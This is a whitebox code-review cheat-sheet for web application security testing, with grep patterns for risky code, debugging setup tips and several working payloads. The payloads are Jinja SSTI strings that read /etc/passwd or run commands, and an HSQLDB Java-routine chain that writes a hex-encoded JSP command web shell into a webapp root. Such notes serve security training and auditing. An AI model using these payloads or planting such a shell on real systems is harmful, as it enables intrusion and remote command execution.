# Whitebox / Code Review Methodologies & Tips


## Quick Greps
* Quick grep commands that may find direct vulnerabilities or used for recon purposes that gives you the lay of the land and tells you about the web application you're dealing with
* These grep commands may not directly give you indication of for example *Deserialization* attack vectors but may give a hint
* Tips
  * Narrow down to individual folders if searching from root directory takes too long
  * Zoom out on your terminal first before grepping
```bash
# Eval (For nodeJS or Java)
grep -Ri "eval(" * --color

#SQLI
egrep -ri "^.*?['\"]SELECT.*?['\"]\ ?[\+\.]" *
egrep -Ri "^.*?['\"]UPDATE.*?SET.*?['\"]\ ?[\+\.]" *
egrep -Ri "^.*?['\"]INSERT INTO.*?['\"]\ ?[\+\.]" *
grep -Ri "queryForList("


# Deserialization
## Java
egrep -Ri "readObject\(\)" *

# XSS 
grep -r "document.write(" ./ --include "*.html"
grep -Ri "<script src=\"' +"


# XXE Injection or at least XML
grep -Ri "= new HashMap" *
grep -Ri "= document.getElementsByTagName("
grep -Ri "document.getDocumentElement()"
grep -Ri "getNodeValue()"
grep -Ri "getNodeValue()"
grep -Ri "NodeList"
grep -Ri "java.util.HashMap"
grep -Ri "<\!\[CDATA\[" *
## Java
egrep -ri "XmlUtil.java" *

# SSTI
grep -Ri ".render(" *

# File System interactions
## Java
grep -Ri "new FileReader(" *



# Weak Random
## Java
grep -Ri "import java.util.Random" *
grep -Ri "new Random(" *



# Websockets
grep -Ri "= new WebSocket(" *
grep -Ri "WebSocket(" *
grep -r "send(" ./ --exclude="compressed*" --exclude="*.js"


# API
grep -Ri "swagger"
grep -Ri "/api" *

# Command Injection
## Linux
grep -Ri "\"su" --exclude "*.js" --exclude "*.html" --exclude "*.css" --exclude "*.svg" --exclude "*.scss"
## Windows
"cmd.exe (.*) /c 
"cmd (.*) /c "
"powershell (.*) -c "
"powershell (.*) -command "
"powershell.exe (.*) -c "
"powershell.exe (.*) -command "

# Deserialization
grep -Ri ".GetType(" *
grep -Ri ".GetType().AssemblyQualifiedName" *
grep -Ri "XmlSerializer(" *
grep -Ri "Serializer" *
grep -Ri ".Serialize(" *
grep -Ri ".Deserialize(" *
grep -Ri "= new XmlDocument()" *
grep -Ri "XmlDocument()" *
grep -Ri "DeSerializeHashtable" *
grep -Ri "XmlUtils.DeSerializeHashtable" *
```

## SSTI
* Detailed SSTI meaning [here](./SSTI.html)
* Test
    ```python
    {{7*7}}
    ```
* Jinja Payload
    * Python2
        ```python
        {{ ''.__class__.__mro__[2].__subclasses()[40]('/etc/passwd').read() }}
        ```
    * Python3
        ```python
        {{ ''.__class__.__mro__[1].__subclasses()[40]('/etc/passwd').read() }}
        ```
    * the number `[420]` may change every instance. This is the subprocess.Popen for RCE
        ```python
        {% set string = "ssti" %}
        {% set class = "__class__" %}
        {% set mro = "__mro__" %}
        {% set subclasses = "__subclasses__" %}
        {% set mro_r = string|attr(class)|attr(mro) %}
        {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
        {{ subclasses_r[420](["/usr/bin/touch","/tmp/poc.txt"]) }}
        ```
## File Upload
* Whitebox
    * Try to upload a file and see where it is uploaded on the file system by using `find` or `grep`
    * Find writable directories
        ```bash
        find /var/www/html/ -type d -perm -o+w
        ```
* File upload via Zip?
    * Try directory traversal to `/tmp`
    * find writable directories on the web root
    * PHP
        * make use of `display_errors` in the PHP settings

## How to track a possible vulnerable function resides?
* can start from top to bottom. From controllers, `grep` for the <something>.phtml or <something>.html. It might give some idea on where it is

## Debugging
* Python SMTP Server[^1]
* MySQL/MariaDB
    * Find the config files
        ```bash
        sudo find / -name "my*.cnf" 2>/dev/null
        ```
    * `/etc/mysql/my.cnf` or `/etc/my.cnf.d/mysql-server.cnf` (restart service after)
        ```
        general_log_file = /var/log/mysql/mysql.log
        general_log = 1
        ```
    * After Change
        ```
        sudo systemctl restart mysql
        sudo tail -f /var/log/mysql/mysql.log
        ```
* PostgreSQL
    * postgresql.conf
        ```
        log_statement = 'all' # none, ddl, mod, all
        ```
        * Restart service (systemctl or services.msc)
    * Execute commands directly using
        * PGAdmin software/GUI
        * `psql.exe -U postgres -p 15432`
* PHP
    * `/etc/php5/apache2/php.ini`
        * `display_errors = On`
* HSQLDB
    * Connect
        ```
        java -cp ./hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://webappserver:9001/DB123 --user sa --password coolAid99
        ```
    * RCE via java routines
        * Checking for properties kind of RCE (Recon phase)
            * Setup function
                ```sql
                CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR
                LANGUAGE JAVA
                DETERMINISTIC NO SQL
                EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
                ```
            * Execute with
                ```sql
                VALUES(systemprop('java.class.path'))
                VALUES(systemprop('user.dir'))
                ```
        * Search for good classes to use (regex)
            ```
            public static void \w+\(String
            ```
        * SQL to Write Files using shared Java libraries
            * Create function
                ```sql
                CREATE PROCEDURE writeBytesToFilename1(IN paramString1 VARCHAR, IN paramArrayOfByte1 VARBINARY(1024))
                LANGUAGE JAVA
                DETERMINISTIC NO SQL
                EXTERNAL NAME
                'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
                ```
            * Call the function
                ```sql
                call writeBytesToFilename1('test.txt',cast ('6f6820796573' AS VARBINARY(1024)))
                ```
            * Reverse shell (JSP)
                * **IMPORTANT** It must fit within 1024 bytes
                ```sql
                call writeBytesToFilename1('../../somejavadir/webapp/ROOT/cmdjsp.jsp',cast ('2f2f206e6f74652074686174206c696e7578203d20636d6420616e642077696e646f7773203d2022636d642e657865202f63202b20636d6422200a0a3c464f524d204d4554484f443d47455420414354494f4e3d27636d646a73702e6a7370273e0a3c494e505554206e616d653d27636d642720747970653d746578743e0a3c494e50555420747970653d7375626d69742076616c75653d2752756e273e0a3c2f464f524d3e0a0a3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b0a202020537472696e67206f7574707574203d2022223b0a0a202020696628636d6420213d206e756c6c29207b0a202020202020537472696e672073203d206e756c6c3b0a202020202020747279207b0a20202020202020202050726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328636d64293b0a2020202020202020204275666665726564526561646572207349203d206e6577204275666665726564526561646572286e657720496e70757453747265616d52656164657228702e676574496e70757453747265616d282929293b0a2020202020202020207768696c65282873203d2073492e726561644c696e6528292920213d206e756c6c29207b0a2020202020202020202020206f7574707574202b3d20733b0a2020202020202020207d0a2020202020207d0a202020202020636174636828494f457863657074696f6e206529207b0a202020202020202020652e7072696e74537461636b547261636528293b0a2020202020207d0a2020207d0a253e0a0a3c7072653e0a3c253d6f757470757420253e0a3c2f7072653e0a0a3c212d2d20202020687474703a2f2f6d69636861656c6461772e6f726720202032303036202020202d2d3e0a' AS VARBINARY(900)))
                ```

## PHP
* Interactive Shell
    * Make sure to do this on the debug/target server since versions may be different
    ```bash
    # Type juggling as example (php )
    user@webapp:~$ php -a
    Interactive mode enabled

    php > echo md5('240610708');
    0e462097431906509019562988736854

    php > var_dump('0e462097431906509019562988736854' == '0');
    bool(true)
    ```
* Watch out for type juggling
    * Find value that compares with a generated substring of a hash
    * If a user controlled input is part of a comparison with only `==` rather than `===`, and the other might be `0e\d\d\d\d\d` then it would result (where m = user input)
        ```php
        if ($code == $m) {
        if (0eDDDDDDDD == 0) {
        ```
* If within array($argument), it is proper/sanitized
* Edit the PHP file to debug, then restart web server/web app
    * got something out by setting `header ('Location: ')+$string` for example
* Create test php functions to verify values on the server itself
    ```php
    # nano /var/www/html/magic.php
    <?php
    var_dump(get_magic_quotes_gpc());
    ?>

    # Retrieve value
    curl http://localhost/magic.php

    ```
* Parameter Pollution to create errors to find the root directory
    ```php
    # Example

    ## Valid
    http://host/webapp/somefunction.php?number=&search=test

    ## Invalid - Target
    http://host/webapp/somefunction.php?number=&search[]=test

    # Now find a writable directory
    find /var/www/html/ -type d -perm -o+w
    ```
* Start with public entities in authentication bypass portion
    ```bash
    grep -rnw /var/www/html/webapp -e "^.*user_location.*public.*" --color
    ```
## XXE (XML External Entity)
* Find in code for possible usage of XML
    ```java
    egrep -ri "XmlUtil.java" *
    ```
* [More XXE](./XXE_Injection.md)

## Java
* Know common java packages such as: (do not waste time decompiling these)
    * `struts.jar` or `xmlsec-1.3.0.jar`
* Open target .jar file with jd-gui and export
    * File -> Save All Sources (Ctrl + Alt + S)
    * Open the exported .zip file in notepad++ or sublime text
* Review files such as web.xml to study routings
* `jshell`
* Use regex to find SQLi (separate note)
* Random
    * beware of which random is used
        * java.util.random is vulnerable
        * Look for this
            ```bash
            grep -Ri "import java.util.Random;" *
            grep -Ri " = new Random(" *
            ```
* It is **IMPORTANT** to check if debug machine and Kali machine has same time
    * Kali may be lagging behind
        * `sudo ntpdate <ntp.server.com>`
* Just recreate these libraries that needs imitation in Java.


## JavaScript / NodeJS
* `node` for interactive shell for testing
    * Remember when testing that it is much better to do it on the debug machine’s interactive `node` shell since the version difference can mean a lot and can save/waste a lot of your time.
* find commands that execute and trace
    ```bash
    grep -rnw "eval(" . --color
    ```

## .NET Applications
* Debug using **dnSpy**
    * Once in **dnSpy**, ++right-button++ on "Edit Assembly Attributes"
    * Replace
        ```
        [assembly:Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
        ```
    * with
        ```
        [assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
        ```
    * Make use of "Call Stack" and "Watch" (Variable)
        * Make use of Breakpoints
            * +f9+ - Set
            * +f5+ - Continue

## Deserialization
* More [here](./Deserialization.html)
* Tip
    * Use ysoserial test payload
        * Combine with `sudo dnschef -i 0.0.0.0` and perform a simple DNS lookup.
        * This means you need to configure the debug machine to make your Kali as its DNS server (just for testing)
* .NET
    * Check around, see deserialization, use ysoserial easy PoC payloads
    * XML should be good
    * Study the functions
    * Learn to use VS Community variables
* Java
    ```bash
    grep iR "readObject\(\)" *
    ```

## Procmon
* If you could only write files but can’t execute them directly
    * Find a file using procmon that gets executed frequently
        * Filter using “Path” to the root folder of the application. If not, maybe All has relations to the path or application (i.e. webapp executed vbs)

## Burp
* In changing method
    * Better to change method (GET to POST or vice versa) automatically using ++right-button++ -> `Change request method` rather than manually changing the text.

## Websockets
* Although possible via Burp, you can have a Python script to basically interact with this.

## Building Scripts
* Make it as simple and modular as possible, nothing fancy.
* From scratch
    * You may base on a simple [template](https://github.com/trojand/Script_Yard/blob/main/TEMPLATE.py) for starters or from absolute scratch
    * Build it bit by bit and print the output at once
        * This is so you know where you are in the development and to have a "hot" or used CLI already.
        * Gives you more control. For example, this is even before you make your first request.get or request.post.
* From other code
    * Comment out the requests and other processing at the bottom of each function and def.
        * Concentrate on the parameters being passed. Then processing of parameters before being "requested".
        * Make sure to print the variable outputs early on.


## Remote Debugging
* Find out a way to enable remote debugging on the target application
* Debug with Visual Studio Code for Linux
    * Install Extensions such as
        * Python
            * Install *ptvsd* (Python Tools for Visual Studio debug) on the target/debugging server
                * `pip3 install ptvsd`
            * Edit whatever file to start *ptvsd*
                ```python
                import ptvsd
                ptvsd.enable_attach(redirect_output=True)
                print("Now ready to be connected to by the IDE")
                ptvsd.wait_for_attach()
                ```
            * By default, *ptvsd* will start on `5678/tcp`
            * Copy the data/code to local Kali and open the folder with VS Code
                * copy using a tool like `rsync` or `scp -prv ...`
            * Start the service on the server  (Depends on the specific app)
            * In VS Code -> Debug -> Python -> Remote Attach
                * type in `IP Address` and `Port` (5678)
            * Continue to edit debug json file to match `remoteRoot` folder to local `${workspaceFolder}`
            * Start the Debugger on VS Code ("*Run/Play*")
            * Create a breaking point on the code in VS Code and try to trigger it


[^1]: [Python3 SMTPD package](../Infrastructure_Setup/Simple_Python_Go_Packages.html#python3-smtpd)
